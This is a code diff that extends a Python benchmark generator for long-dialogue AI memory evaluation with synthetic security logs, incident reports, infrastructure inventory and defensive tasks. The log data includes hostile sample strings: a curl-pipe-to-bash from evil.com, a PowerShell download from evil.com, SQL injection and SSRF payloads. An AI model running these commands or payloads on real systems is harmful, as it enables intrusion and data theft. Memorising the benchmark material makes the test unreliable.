@@ -4,7 +4,8 @@ Philosophy:
 - No LLM needed for data generation -- all content is template-based
 - Reproducible: same seed produces identical dialogue every time
 - Ground truth tracked for every fact delivered
-- 8 information blocks test different memory challenges
+- 12 information blocks test different memory challenges (including security domain)
+- Scales to 5000+ turns with proportional block allocation
 
 Public API:
     Turn: Dataclass for a single dialogue turn
@@ -16,9 +17,13 @@ Public API:
 
 from __future__ import annotations
 
+import logging
 import random
+import time
 from dataclasses import dataclass, field
 from typing import Any
+
+logger = logging.getLogger(__name__)
 
 
 @dataclass
@@ -27,7 +32,7 @@ class Turn:
 
     turn_number: int
     content: str
-    block: int  # 1-8
+    block: int  # 1-12
     block_name: str
     facts: list[dict[str, str]]  # Ground truth facts delivered
 
@@ -42,6 +47,7 @@ class Question:
     category: str  # needle_in_haystack, temporal_evolution, etc.
     relevant_turns: list[int]  # Which turns contain the answer
     scoring_dimensions: list[str]  # Which dimensions matter for this question
+    chain_length: int = 1  # Number of hops for multi-hop questions (1 = single-hop)
 
 
 @dataclass
@@ -749,6 +755,321 @@ DISTRACTOR_TOPICS = [
 ]
 
 
+# ============================================================
+# Security logs (Block 9)
+# ============================================================
+
+SECURITY_EVENTS = [
+    {"timestamp": "2024-03-15 14:23:01", "source_ip": "192.168.1.45", "event": "Failed SSH login", "user": "admin", "severity": "medium"},
+    {"timestamp": "2024-03-15 14:23:05", "source_ip": "192.168.1.45", "event": "Failed SSH login", "user": "root", "severity": "high"},
+    {"timestamp": "2024-03-15 14:23:08", "source_ip": "192.168.1.45", "event": "Failed SSH login", "user": "admin", "severity": "medium"},
+    {"timestamp": "2024-03-15 14:23:12", "source_ip": "192.168.1.45", "event": "Failed SSH login", "user": "root", "severity": "high"},
+    {"timestamp": "2024-03-15 14:23:15", "source_ip": "192.168.1.45", "event": "Failed SSH login", "user": "admin", "severity": "medium"},
+    {"timestamp": "2024-03-15 14:23:18", "source_ip": "192.168.1.45", "event": "Failed SSH login", "user": "root", "severity": "high"},
+    {"timestamp": "2024-03-15 14:23:22", "source_ip": "192.168.1.45", "event": "Successful SSH login", "user": "admin", "severity": "critical"},
+    {"timestamp": "2024-03-15 14:30:00", "source_ip": "192.168.1.45", "event": "Privilege escalation attempt", "user": "admin", "severity": "critical"},
+    {"timestamp": "2024-03-15 15:00:00", "source_ip": "10.0.0.50", "event": "Port scan detected", "user": "N/A", "severity": "high", "ports_scanned": "22,80,443,3306,5432,8080,8443"},
+    {"timestamp": "2024-03-15 15:05:00", "source_ip": "10.0.0.50", "event": "SQL injection attempt", "user": "N/A", "severity": "critical", "target": "/api/v1/users?id=1 OR 1=1"},
+    {"timestamp": "2024-03-15 15:10:00", "source_ip": "10.0.0.50", "event": "WAF blocked request", "user": "N/A", "severity": "medium", "rule": "OWASP-CRS-942100"},
+    {"timestamp": "2024-03-16 02:00:00", "source_ip": "172.16.0.100", "event": "Large data transfer", "user": "svc_backup", "severity": "high", "bytes_transferred": "2.3GB", "destination": "external_ip:185.220.101.45"},
+    {"timestamp": "2024-03-16 02:15:00", "source_ip": "172.16.0.100", "event": "Anomalous DNS query", "user": "svc_backup", "severity": "high", "query": "data.exfil.evil.com"},
+    {"timestamp": "2024-03-16 02:20:00", "source_ip": "172.16.0.100", "event": "Connection to known C2 server", "user": "svc_backup", "severity": "critical", "c2_ip": "185.220.101.45"},
+    {"timestamp": "2024-03-16 08:00:00", "source_ip": "10.0.1.25", "event": "Failed MFA challenge", "user": "jsmith", "severity": "medium"},
+    {"timestamp": "2024-03-16 08:01:00", "source_ip": "10.0.1.25", "event": "Failed MFA challenge", "user": "jsmith", "severity": "medium"},
+    {"timestamp": "2024-03-16 08:02:00", "source_ip": "10.0.1.25", "event": "Account locked", "user": "jsmith", "severity": "high"},
+    {"timestamp": "2024-03-16 09:00:00", "source_ip": "192.168.2.10", "event": "Firewall rule change", "user": "netadmin", "severity": "medium", "rule": "Allow 0.0.0.0/0 to port 3389"},
+    {"timestamp": "2024-03-16 09:05:00", "source_ip": "192.168.2.10", "event": "RDP brute force detected", "user": "N/A", "severity": "critical", "attempts": 150},
+    {"timestamp": "2024-03-16 10:00:00", "source_ip": "10.0.0.5", "event": "Malware signature detected", "user": "N/A", "severity": "critical", "malware": "Cobalt Strike beacon", "file": "/tmp/.hidden/payload.exe"},
+    {"timestamp": "2024-03-16 10:05:00", "source_ip": "10.0.0.5", "event": "Lateral movement detected", "user": "SYSTEM", "severity": "critical", "technique": "PsExec", "target": "10.0.0.6,10.0.0.7"},
+    {"timestamp": "2024-03-16 11:00:00", "source_ip": "10.0.3.15", "event": "Certificate expiry warning", "user": "N/A", "severity": "low", "cert": "*.internal.corp", "days_remaining": 7},
+    {"timestamp": "2024-03-16 12:00:00", "source_ip": "10.0.0.8", "event": "Unauthorized API access", "user": "api_guest", "severity": "high", "endpoint": "/admin/config"},
+    {"timestamp": "2024-03-16 13:00:00", "source_ip": "10.0.0.9", "event": "Suspicious PowerShell execution", "user": "workstation\\user1", "severity": "high", "command": "Invoke-WebRequest -Uri http://evil.com/shell.ps1"},
+    {"timestamp": "2024-03-16 14:00:00", "source_ip": "10.0.0.10", "event": "Database dump detected", "user": "db_readonly", "severity": "critical", "tables": "users,credentials,api_keys"},
+    {"timestamp": "2024-03-17 00:00:00", "source_ip": "10.0.0.11", "event": "Crypto mining process detected", "user": "N/A", "severity": "high", "process": "xmrig", "cpu_usage": "95%"},
+    {"timestamp": "2024-03-17 06:00:00", "source_ip": "10.0.4.1", "event": "VPN connection from unusual country", "user": "cjohnson", "severity": "medium", "country": "North Korea"},
+    {"timestamp": "2024-03-17 08:00:00", "source_ip": "10.0.0.12", "event": "File integrity violation", "user": "N/A", "severity": "high", "file": "/etc/passwd", "change": "new user added: backdoor"},
+    {"timestamp": "2024-03-17 09:00:00", "source_ip": "10.0.0.13", "event": "SIEM correlation alert", "user": "N/A", "severity": "critical", "rule": "APT-CHAIN-001", "related_events": "brute_force,lateral_movement,data_exfil"},
+    {"timestamp": "2024-03-17 10:00:00", "source_ip": "10.0.5.1", "event": "Phishing email detected", "user": "hr_inbox", "severity": "high", "subject": "Urgent: Update your credentials", "sender": "support@1egit-company.com"},
+    {"timestamp": "2024-03-17 11:00:00", "source_ip": "10.0.0.14", "event": "Container escape attempt", "user": "N/A", "severity": "critical", "container": "web-app-prod-3", "technique": "CVE-2024-21626"},
+    {"timestamp": "2024-03-17 12:00:00", "source_ip": "10.0.0.15", "event": "AWS key exposure", "user": "developer1", "severity": "critical", "key_type": "AKIA*", "found_in": "public GitHub repo"},
+    {"timestamp": "2024-03-17 13:00:00", "source_ip": "10.0.6.1", "event": "DDoS attack detected", "user": "N/A", "severity": "high", "type": "SYN flood", "pps": "500K", "target": "api-gateway"},
+    {"timestamp": "2024-03-17 14:00:00", "source_ip": "10.0.0.16", "event": "Insider threat indicator", "user": "disgruntled_emp", "severity": "high", "activity": "bulk download of sensitive docs"},
+    {"timestamp": "2024-03-17 15:00:00", "source_ip": "10.0.7.1", "event": "DNS tunneling detected", "user": "N/A", "severity": "high", "domain": "*.tunnel.attacker.net", "data_rate": "50KB/s"},
+    {"timestamp": "2024-03-17 16:00:00", "source_ip": "10.0.0.17", "event": "Successful exploitation", "user": "N/A", "severity": "critical", "vulnerability": "CVE-2024-3094", "target_service": "xz-utils/sshd"},
+    {"timestamp": "2024-03-17 17:00:00", "source_ip": "10.0.0.18", "event": "Anomalous cron job created", "user": "www-data", "severity": "high", "command": "curl http://evil.com/c2.sh | bash"},
+    {"timestamp": "2024-03-17 18:00:00", "source_ip": "10.0.8.1", "event": "Security group modification", "user": "iam_admin", "severity": "medium", "change": "SSH opened to 0.0.0.0/0"},
+    {"timestamp": "2024-03-17 19:00:00", "source_ip": "10.0.0.19", "event": "Ransomware behavior detected", "user": "SYSTEM", "severity": "critical", "indicator": "mass file encryption (.locked extension)"},
+    {"timestamp": "2024-03-17 20:00:00", "source_ip": "10.0.0.20", "event": "Supply chain compromise", "user": "N/A", "severity": "critical", "package": "event-stream@5.0.0", "type": "malicious dependency"},
+    {"timestamp": "2024-03-18 00:00:00", "source_ip": "10.0.0.21", "event": "Kerberoasting detected", "user": "N/A", "severity": "high", "target_spn": "MSSQLSvc/db01.corp:1433"},
+    {"timestamp": "2024-03-18 01:00:00", "source_ip": "10.0.0.22", "event": "Golden ticket usage", "user": "krbtgt", "severity": "critical", "domain": "corp.internal"},
+    {"timestamp": "2024-03-18 02:00:00", "source_ip": "10.0.0.23", "event": "CloudTrail logging disabled", "user": "rogue_admin", "severity": "critical", "account": "prod-account-123"},
+    {"timestamp": "2024-03-18 03:00:00", "source_ip": "10.0.9.1", "event": "WAF bypass detected", "user": "N/A", "severity": "high", "technique": "Unicode normalization", "payload": "%u0027 OR 1=1"},
+    {"timestamp": "2024-03-18 04:00:00", "source_ip": "10.0.0.24", "event": "Secrets manager access spike", "user": "lambda_func", "severity": "high", "secrets_accessed": 47, "normal_avg": 3},
+    {"timestamp": "2024-03-18 05:00:00", "source_ip": "10.0.0.25", "event": "TLS downgrade attempt", "user": "N/A", "severity": "medium", "from_version": "TLS 1.3", "to_version": "TLS 1.0"},
+    {"timestamp": "2024-03-18 06:00:00", "source_ip": "10.0.10.1", "event": "Zero-day exploit attempt", "user": "N/A", "severity": "critical", "target": "Exchange Server", "cve": "CVE-2024-XXXX"},
+    {"timestamp": "2024-03-18 07:00:00", "source_ip": "10.0.0.26", "event": "Service account password spray", "user": "N/A", "severity": "high", "accounts_targeted": 200, "password_used": "Summer2024!"},
+    {"timestamp": "2024-03-18 08:00:00", "source_ip": "10.0.0.27", "event": "Unauthorized S3 bucket access", "user": "external", "severity": "critical", "bucket": "prod-customer-data", "action": "GetObject"},
+    {"timestamp": "2024-03-18 09:00:00", "source_ip": "10.0.0.28", "event": "SSRF vulnerability exploited", "user": "N/A", "severity": "critical", "internal_target": "http://169.254.169.254/latest/meta-data/iam/"},
+]
+
+# ============================================================
+# Incident reports (Block 10)
+# ============================================================
+
+INCIDENTS = [
+    {
+        "id": "INC-2024-001",
+        "title": "Ransomware attempt on file server",
+        "status": "contained",
+        "severity": "critical",
+        "affected_systems": ["FS-01", "FS-02", "BACKUP-01"],
+        "iocs": ["185.220.101.45", "evil.com", "payload.exe", "Cobalt Strike"],
+        "cves": ["CVE-2024-21626"],
+        "timeline": [
+            {"time": "2024-03-17 19:00", "action": "Ransomware behavior detected on FS-01"},
+            {"time": "2024-03-17 19:15", "action": "Incident declared, SOC notified"},
+            {"time": "2024-03-17 19:30", "action": "FS-01 isolated from network"},
+            {"time": "2024-03-17 20:00", "action": "FS-02 found encrypted, isolated"},
+            {"time": "2024-03-17 21:00", "action": "BACKUP-01 verified clean"},
+            {"time": "2024-03-17 22:00", "action": "Containment confirmed, no further spread"},
+        ],
+        "updates": [
+            {"turn_pct": 0.3, "new_status": "investigating", "detail": "Root cause analysis in progress; initial entry via phishing email"},
+            {"turn_pct": 0.6, "new_status": "remediated", "detail": "All encrypted files restored from backup; attacker C2 blocked at firewall"},
+            {"turn_pct": 0.9, "new_status": "closed", "detail": "Post-incident review complete; MFA enforced for all admin accounts"},
+        ],
+    },
+    {
+        "id": "INC-2024-002",
+        "title": "Data exfiltration via compromised service account",
+        "status": "active",
+        "severity": "critical",
+        "affected_systems": ["DB-PROD-01", "API-GW-01"],
+        "iocs": ["172.16.0.100", "data.exfil.evil.com", "svc_backup"],
+        "cves": [],
+        "timeline": [
+            {"time": "2024-03-16 02:00", "action": "Large data transfer detected from DB-PROD-01"},
+            {"time": "2024-03-16 02:20", "action": "C2 connection confirmed to 185.220.101.45"},
+            {"time": "2024-03-16 03:00", "action": "svc_backup account disabled"},
+            {"time": "2024-03-16 04:00", "action": "Forensic imaging of DB-PROD-01 initiated"},
+        ],
+        "updates": [
+            {"turn_pct": 0.4, "new_status": "investigating", "detail": "Confirmed 2.3GB exfiltrated; customer PII may be affected"},
+            {"turn_pct": 0.7, "new_status": "contained", "detail": "All service account passwords rotated; egress filtering tightened"},
+            {"turn_pct": 0.95, "new_status": "remediated", "detail": "Breach notification sent to 15,000 affected customers"},
+        ],
+    },
+    {
+        "id": "INC-2024-003",
+        "title": "APT campaign targeting development infrastructure",
+        "status": "active",
+        "severity": "critical",
+        "affected_systems": ["CI-SERVER-01", "GIT-01", "DEV-WORKSTATION-12"],
+        "iocs": ["event-stream@5.0.0", "tunnel.attacker.net", "xmrig"],
+        "cves": ["CVE-2024-3094"],
+        "timeline": [
+            {"time": "2024-03-17 16:00", "action": "Supply chain compromise detected in event-stream package"},
+            {"time": "2024-03-17 16:30", "action": "CI-SERVER-01 found running crypto miner"},
+            {"time": "2024-03-17 17:00", "action": "DNS tunneling from GIT-01 confirmed"},
+            {"time": "2024-03-17 18:00", "action": "xz-utils backdoor (CVE-2024-3094) found on DEV-WORKSTATION-12"},
+        ],
+        "updates": [
+            {"turn_pct": 0.5, "new_status": "investigating", "detail": "APT group attribution: likely state-sponsored; TTPs match APT29"},
+            {"turn_pct": 0.8, "new_status": "contained", "detail": "All affected systems rebuilt from golden images; package audit complete"},
+        ],
+    },
+    {
+        "id": "INC-2024-004",
+        "title": "Cloud credential exposure in public repository",
+        "status": "active",
+        "severity": "high",
+        "affected_systems": ["AWS-PROD-ACCOUNT", "S3-CUSTOMER-DATA"],
+        "iocs": ["AKIA*", "prod-customer-data"],
+        "cves": [],
+        "timeline": [
+            {"time": "2024-03-17 12:00", "action": "AWS key found in public GitHub repository"},
+            {"time": "2024-03-17 12:05", "action": "Key immediately revoked via AWS console"},
+            {"time": "2024-03-17 12:15", "action": "CloudTrail audit initiated for key usage"},
+        ],
+        "updates": [
+            {"turn_pct": 0.35, "new_status": "investigating", "detail": "Key was used 3 times from unknown IP before revocation"},
+            {"turn_pct": 0.65, "new_status": "contained", "detail": "S3 access logs show no customer data accessed; key only listed buckets"},
+            {"turn_pct": 0.85, "new_status": "closed", "detail": "Git-secrets hook deployed to all repos; mandatory pre-commit scanning"},
+        ],
+    },
+    {
+        "id": "INC-2024-005",
+        "title": "Brute force attack on RDP services",
+        "status": "contained",
+        "severity": "high",
+        "affected_systems": ["JUMP-01", "TERM-SERVER-01"],
+        "iocs": ["192.168.2.10", "0.0.0.0/0:3389"],
+        "cves": [],
+        "timeline": [
+            {"time": "2024-03-16 09:00", "action": "Firewall rule change detected: RDP opened to internet"},
+            {"time": "2024-03-16 09:05", "action": "150 RDP brute force attempts detected"},
+            {"time": "2024-03-16 09:10", "action": "Firewall rule reverted; RDP restricted to VPN only"},
+        ],
+        "updates": [
+            {"turn_pct": 0.45, "new_status": "remediated", "detail": "No successful logins confirmed; network admin retrained on change management"},
+            {"turn_pct": 0.75, "new_status": "closed", "detail": "Firewall change automation deployed requiring approval workflow"},
+        ],
+    },
+    {
+        "id": "INC-2024-006",
+        "title": "Insider threat - bulk document download",
+        "status": "active",
+        "severity": "high",
+        "affected_systems": ["SHAREPOINT-01", "DLP-GATEWAY"],
+        "iocs": ["disgruntled_emp", "bulk_download"],
+        "cves": [],
+        "timeline": [
+            {"time": "2024-03-17 14:00", "action": "DLP alert: user downloaded 500+ sensitive documents"},
+            {"time": "2024-03-17 14:30", "action": "User account suspended pending investigation"},
+            {"time": "2024-03-17 15:00", "action": "HR and Legal notified; device confiscated"},
+        ],
+        "updates": [
+            {"turn_pct": 0.55, "new_status": "investigating", "detail": "User had tendered resignation 2 weeks prior; downloading competitor-sensitive data"},
+            {"turn_pct": 0.85, "new_status": "closed", "detail": "Legal action initiated; DLP policies updated to block bulk downloads"},
+        ],
+    },
+    {
+        "id": "INC-2024-007",
+        "title": "Phishing campaign targeting HR department",
+        "status": "active",
+        "severity": "medium",
+        "affected_systems": ["MAIL-GW-01", "HR-WORKSTATION-03"],
+        "iocs": ["support@1egit-company.com", "credential-update.phish.com"],
+        "cves": [],
+        "timeline": [
+            {"time": "2024-03-17 10:00", "action": "Phishing email detected by mail gateway"},
+            {"time": "2024-03-17 10:15", "action": "3 users clicked link; 1 entered credentials"},
+            {"time": "2024-03-17 10:30", "action": "Affected user password reset; session tokens revoked"},
+        ],
+        "updates": [
+            {"turn_pct": 0.4, "new_status": "contained", "detail": "No lateral movement from compromised account; MFA prevented access"},
+            {"turn_pct": 0.7, "new_status": "closed", "detail": "Phishing awareness training scheduled; email domain blocklisted"},
+        ],
+    },
+]
+
+# ============================================================
+# Infrastructure inventory (Block 11)
+# ============================================================
+
+INFRASTRUCTURE = {
+    "subnets": [
+        {"name": "prod-web", "cidr": "10.0.1.0/24", "purpose": "Production web servers", "az": "us-east-1a"},
+        {"name": "prod-app", "cidr": "10.0.2.0/24", "purpose": "Application tier", "az": "us-east-1b"},
+        {"name": "prod-db", "cidr": "10.0.3.0/24", "purpose": "Database tier", "az": "us-east-1c"},
+        {"name": "dmz", "cidr": "10.0.4.0/24", "purpose": "DMZ for public-facing services", "az": "us-east-1a"},
+        {"name": "mgmt", "cidr": "10.0.5.0/24", "purpose": "Management and monitoring", "az": "us-east-1b"},
+        {"name": "dev", "cidr": "10.0.6.0/24", "purpose": "Development environment", "az": "us-east-1c"},
+        {"name": "staging", "cidr": "10.0.7.0/24", "purpose": "Staging/pre-production", "az": "us-east-1a"},
+        {"name": "vpn", "cidr": "10.0.8.0/24", "purpose": "VPN gateway subnet", "az": "us-east-1b"},
+    ],
+    "load_balancers": [
+        {"name": "alb-prod-web", "type": "ALB", "target": "prod-web", "ports": [80, 443], "ssl_cert": "*.prod.company.com"},
+        {"name": "nlb-prod-api", "type": "NLB", "target": "prod-app", "ports": [8443], "ssl_cert": "api.company.com"},
+        {"name": "alb-staging", "type": "ALB", "target": "staging", "ports": [80, 443], "ssl_cert": "*.staging.company.com"},
+    ],
+    "kubernetes_clusters": [
+        {"name": "k8s-prod", "version": "1.29", "nodes": 12, "subnet": "prod-app", "namespace_count": 8, "pod_count": 156},
+        {"name": "k8s-staging", "version": "1.28", "nodes": 4, "subnet": "staging", "namespace_count": 4, "pod_count": 42},
+        {"name": "k8s-dev", "version": "1.29", "nodes": 2, "subnet": "dev", "namespace_count": 12, "pod_count": 28},
+    ],
+    "firewall_rules": [
+        {"name": "allow-web-ingress", "source": "0.0.0.0/0", "dest": "prod-web", "ports": "80,443", "action": "allow"},
+        {"name": "allow-api-ingress", "source": "0.0.0.0/0", "dest": "prod-app", "ports": "8443", "action": "allow"},
+        {"name": "deny-db-public", "source": "0.0.0.0/0", "dest": "prod-db", "ports": "*", "action": "deny"},
+        {"name": "allow-mgmt-ssh", "source": "10.0.8.0/24", "dest": "mgmt", "ports": "22", "action": "allow"},
+        {"name": "allow-db-from-app", "source": "10.0.2.0/24", "dest": "prod-db", "ports": "5432,3306", "action": "allow"},
+        {"name": "deny-dev-to-prod", "source": "10.0.6.0/24", "dest": "10.0.1.0/24,10.0.2.0/24,10.0.3.0/24", "ports": "*", "action": "deny"},
+    ],
+    "dns_records": [
+        {"name": "api.company.com", "type": "A", "target": "alb-prod-web", "ttl": 300},
+        {"name": "app.company.com", "type": "CNAME", "target": "alb-prod-web.us-east-1.elb.amazonaws.com", "ttl": 300},
+        {"name": "db-primary.internal", "type": "A", "target": "10.0.3.10", "ttl": 60},
+        {"name": "db-replica.internal", "type": "A", "target": "10.0.3.11", "ttl": 60},
+        {"name": "monitoring.internal", "type": "A", "target": "10.0.5.20", "ttl": 300},
+        {"name": "vpn.company.com", "type": "A", "target": "10.0.8.1", "ttl": 3600},
+    ],
+    "databases": [
+        {"name": "pg-primary", "engine": "PostgreSQL 16", "host": "10.0.3.10", "port": 5432, "size_gb": 450, "replicas": 2},
+        {"name": "redis-cache", "engine": "Redis 7.2", "host": "10.0.3.20", "port": 6379, "size_gb": 16, "mode": "cluster"},
+        {"name": "es-logs", "engine": "Elasticsearch 8.12", "host": "10.0.5.30", "port": 9200, "size_gb": 2000, "nodes": 5},
+        {"name": "mongo-events", "engine": "MongoDB 7.0", "host": "10.0.3.30", "port": 27017, "size_gb": 120, "replicas": 3},
+    ],
+}
+
+# ============================================================
+# Problem-solving tasks (Block 12)
+# ============================================================
+
+PROBLEM_TASKS = [
+    {
+        "task": "Write a bash script to extract all unique source IPs from the auth log that failed login more than 5 times",
+        "expected_approach": "awk/grep pipeline with sort | uniq -c | sort -rn, filtering for 'Failed' keyword",
+        "context_facts": ["auth log at /var/log/auth.log", "format: timestamp user source_ip action"],
+    },
+    {
+        "task": "Design a Terraform module for the DMZ subnet with WAF",
+        "expected_approach": "azurerm_subnet + azurerm_web_application_firewall_policy with OWASP ruleset",
+        "context_facts": ["Azure subscription", "DMZ CIDR 10.0.4.0/24", "WAF should use OWASP 3.2 ruleset"],
+    },
+    {
+        "task": "Write a Python script to parse the security events and identify brute force patterns (more than 5 failed logins from same IP within 60 seconds)",
+        "expected_approach": "Group events by source_ip, filter by time window using datetime, threshold check",
+        "context_facts": ["Events are JSON with timestamp, source_ip, event fields", "Brute force = 5+ failures in 60s"],
+    },
+    {
+        "task": "Create a Kubernetes NetworkPolicy that allows only prod-app pods to access the database on port 5432",
+        "expected_approach": "NetworkPolicy with podSelector for app tier, ingress rule for port 5432",
+        "context_facts": ["K8s cluster k8s-prod", "DB on port 5432 in prod-db subnet", "App pods labeled app=backend"],
+    },
+    {
+        "task": "Write a SIEM correlation rule to detect the APT kill chain: recon -> exploitation -> lateral movement -> exfiltration",
+        "expected_approach": "Multi-stage rule with time window, correlating port_scan + exploit + psexec + large_transfer events",
+        "context_facts": ["SIEM uses Sigma rule format", "Time window should be 24 hours", "Minimum confidence threshold 0.8"],
+    },
+    {
+        "task": "Design an incident response playbook for ransomware detection and containment",
+        "expected_approach": "5-phase playbook: detect, triage, contain, eradicate, recover with specific actions at each phase",
+        "context_facts": ["Reference NIST SP 800-61", "Must include network isolation steps", "Recovery from known-good backups"],
+    },
+    {
+        "task": "Write a SQL query to find all database users with excessive privileges who haven't logged in for 90 days",
+        "expected_approach": "JOIN pg_roles with pg_stat_activity, filter by last_login date and role membership",
+        "context_facts": ["PostgreSQL 16 database", "Use pg_roles and pg_stat_activity views", "90-day threshold"],
+    },
+    {
+        "task": "Create a CloudWatch alarm and SNS notification for detecting unusual API Gateway error rates",
+        "expected_approach": "CloudWatch metric math for 5xx rate, threshold at 5%, SNS topic with email subscription",
+        "context_facts": ["AWS CloudWatch", "API Gateway logs to CloudWatch", "Alert when 5xx > 5% of total requests"],
+    },
+    {
+        "task": "Write a Suricata IDS rule to detect DNS tunneling with high entropy domain names",
+        "expected_approach": "Suricata rule using dns.query with PCRE for high-entropy base64-like subdomains",
+        "context_facts": ["Suricata IDS version 7", "DNS tunneling uses encoded data in subdomains", "Entropy threshold > 3.5 bits/char"],
+    },
+    {
+        "task": "Design a log retention and rotation policy for compliance with SOC2 requirements",
+        "expected_approach": "Tiered retention: hot (30d), warm (90d), cold (365d), archive (7yr) with automated lifecycle rules",
+        "context_facts": ["SOC2 requires minimum 1 year retention", "Current log volume is 50GB/day", "Must support searchability for 90 days"],
+    },
+    {
+        "task": "Write a Python script to calculate the CVSS v3.1 base score given the attack vector metrics",
+        "expected_approach": "Implementation of CVSS formula with ISS, ISC, exploitability sub-scores",
+        "context_facts": ["CVSS v3.1 specification", "Input: AV, AC, PR, UI, S, C, I, A metrics", "Output: base score 0.0-10.0"],
+    },
+    {
+        "task": "Create a Prometheus alerting rule for detecting certificate expiry within 7 days",
+        "expected_approach": "PromQL using probe_ssl_earliest_cert_expiry from blackbox exporter, alert when < 7d",
+        "context_facts": ["Prometheus with blackbox exporter", "Certificates on *.internal.corp", "Alert via AlertManager"],
+    },
+]
+
+
 def _scale_range(start: int, end: int, target_turns: int, total_turns: int) -> tuple[int, int]:
     """Scale a block range to fit within a target number of turns."""
     ratio = target_turns / total_turns
@@ -760,6 +1081,9 @@ def _scale_range(start: int, end: int, target_turns: int, total_turns: int) -> t
 def generate_dialogue(num_turns: int = 1000, seed: int = 42) -> GroundTruth:
     """Generate deterministic dialogue content for memory evaluation.
 
+    Supports scaling to 5000+ turns with 12 information blocks.
+    Logs progress every 500 turns for large dialogue generation.
+
     Args:
         num_turns: Total number of dialogue turns (default 1000)
         seed: Random seed for reproducibility
@@ -767,6 +1091,7 @@ def generate_dialogue(num_turns: int = 1000, seed: int = 42) -> GroundTruth:
     Returns:
         GroundTruth containing all turns, facts, and tracking data
     """
+    gen_start = time.time()
     rng = random.Random(seed)
     turns: list[Turn] = []
     facts_by_entity: dict[str, list[dict[str, Any]]] = {}
@@ -774,21 +1099,30 @@ def generate_dialogue(num_turns: int = 1000, seed: int = 42) -> GroundTruth:
     superseded_values: dict[str, list[dict[str, Any]]] = {}
 
     # Calculate block boundaries scaled to num_turns
-    # Standard: 1-50, 51-150, 151-300, 301-500, 501-700, 701-850, 851-950, 951-1000
-    blocks = [
-        (1, 50, "people"),
-        (51, 150, "projects"),
-        (151, 300, "technical"),
-        (301, 500, "evolving_story"),
-        (501, 700, "numerical"),
-        (701, 850, "contradictory"),
-        (851, 950, "callbacks"),
-        (951, 1000, "distractors"),
+    # For 1000 turns (original 8 blocks):
+    #   1-50, 51-150, 151-300, 301-500, 501-700, 701-850, 851-950, 951-1000
+    # For 5000 turns (12 blocks, proportional allocation):
+    #   Blocks 1-8 get ~70% of turns, blocks 9-12 get ~30%
+    # The reference base is 5000 turns for the 12-block layout.
+    REFERENCE_BASE = 5000
+    blocks_12 = [
+        (1, 250, "people"),           # Block 1:  5%
+        (251, 750, "projects"),       # Block 2: 10%
+        (751, 1250, "technical"),     # Block 3: 10%
+        (1251, 2000, "evolving_story"),  # Block 4: 15%
+        (2001, 2500, "numerical"),    # Block 5: 10%
+        (2501, 2900, "contradictory"),   # Block 6:  8%
+        (2901, 3200, "callbacks"),    # Block 7:  6%
+        (3201, 3500, "distractors"),  # Block 8:  6%
+        (3501, 4000, "security_logs"),   # Block 9: 10%
+        (4001, 4400, "incidents"),    # Block 10: 8%
+        (4401, 4750, "infrastructure"),  # Block 11: 7%
+        (4751, 5000, "problem_solving"), # Block 12: 5%
     ]
 
     scaled_blocks: list[tuple[int, int, str]] = []
-    for start, end, name in blocks:
-        s, e = _scale_range(start, end, num_turns, 1000)
+    for start, end, name in blocks_12:
+        s, e = _scale_range(start, end, num_turns, REFERENCE_BASE)
         scaled_blocks.append((s, e, name))
 
     turn_idx = 0
@@ -1366,6 +1700,355 @@ def generate_dialogue(num_turns: int = 1000, seed: int = 42) -> GroundTruth:
         turn_idx += 1
         dist_idx += 1
 
+    # Progress logging
+    if num_turns >= 500 and turn_idx % 500 == 0:
+        logger.info("Generated %d/%d turns (%.1fs)", turn_idx, num_turns, time.time() - gen_start)
+
+    # Block 9: Security logs
+    if len(scaled_blocks) > 8:
+        b_start, b_end, _ = scaled_blocks[8]
+        sec_idx = 0
+        while turn_idx < b_end and sec_idx < len(SECURITY_EVENTS):
+            evt = SECURITY_EVENTS[sec_idx]
+            # Build content from event fields
+            extra_detail = ""
+            for extra_key in ("ports_scanned", "target", "rule", "bytes_transferred",
+                              "destination", "query", "c2_ip", "malware", "file",
+                              "technique", "cert", "days_remaining", "endpoint",
+                              "command", "tables", "process", "cpu_usage", "country",
+                              "change", "related_events", "subject", "sender",
+                              "container", "key_type", "found_in", "type", "pps",
+                              "activity", "domain", "data_rate", "vulnerability",
+                              "target_service", "cve", "accounts_targeted",
+                              "password_used", "bucket", "action", "internal_target",
+                              "attempts", "from_version", "to_version", "secrets_accessed",
+                              "normal_avg", "target_spn", "payload", "package",
+                              "indicator", "account"):
+                if extra_key in evt:
+                    extra_detail += f" {extra_key.replace('_', ' ')}: {evt[extra_key]}."
+
+            content = (
+                f"Security log [{evt['timestamp']}]: {evt['event']} from {evt['source_ip']} "
+                f"(user: {evt['user']}, severity: {evt['severity']}).{extra_detail}"
+            )
+            facts = [
+                {"entity": f"security_event_{sec_idx}", "attribute": "event", "value": evt["event"]},
+                {"entity": f"security_event_{sec_idx}", "attribute": "source_ip", "value": evt["source_ip"]},
+                {"entity": f"security_event_{sec_idx}", "attribute": "severity", "value": evt["severity"]},
+                {"entity": f"security_event_{sec_idx}", "attribute": "timestamp", "value": evt["timestamp"]},
+            ]
+            if evt.get("user") and evt["user"] != "N/A":
+                facts.append({"entity": f"security_event_{sec_idx}", "attribute": "user", "value": evt["user"]})
+
+            for f in facts:
+                ek = f"{f['entity']}.{f['attribute']}"
+                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
+                current_values[ek] = f["value"]
+
+            turns.append(
+                Turn(turn_number=turn_idx, content=content, block=9, block_name="security_logs", facts=facts)
+            )
+            turn_idx += 1
+            sec_idx += 1
+
+        # Cycle through events if more turns needed
+        while turn_idx < b_end:
+            evt = SECURITY_EVENTS[turn_idx % len(SECURITY_EVENTS)]
+            content = f"Security log replay [{evt['timestamp']}]: {evt['event']} from {evt['source_ip']}."
+            turns.append(
+                Turn(turn_number=turn_idx, content=content, block=9, block_name="security_logs", facts=[])
+            )
+            turn_idx += 1
+
+    # Progress logging
+    if num_turns >= 500 and turn_idx >= 500 and turn_idx % 500 < 100:
+        logger.info("Generated %d/%d turns (%.1fs)", turn_idx, num_turns, time.time() - gen_start)
+
+    # Block 10: Incident reports (with evolving status updates)
+    if len(scaled_blocks) > 9:
+        b_start, b_end, _ = scaled_blocks[9]
+
+        # First, introduce each incident
+        for inc in INCIDENTS:
+            if turn_idx >= b_end:
+                break
+
+            timeline_text = "; ".join(f"{t['time']}: {t['action']}" for t in inc["timeline"][:3])
+            systems_text = ", ".join(inc["affected_systems"])
+            iocs_text = ", ".join(inc["iocs"][:4])
+            cves_text = ", ".join(inc["cves"]) if inc["cves"] else "None identified"
+
+            content = (
+                f"Incident Report {inc['id']}: {inc['title']}. "
